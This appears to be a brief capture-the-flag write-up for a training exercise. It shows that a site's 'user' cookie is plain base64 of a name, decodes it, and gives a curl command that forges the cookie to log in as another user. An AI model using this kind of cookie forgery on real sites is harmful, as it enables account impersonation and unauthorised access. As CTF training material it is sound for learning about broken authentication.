If look at the cookies we can see the value

> user=Sk9ITitET0U%3D

decode this as base64(`%3D` is `=`) and get

> JOHN+DOE

so if we want to be logged in as the user Mary Jane, change previous value to TUFSWStKQU5F(MARY+JANE) in browser or use curl:

> curl --cookie "user=TUFSWStKQU5F" http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php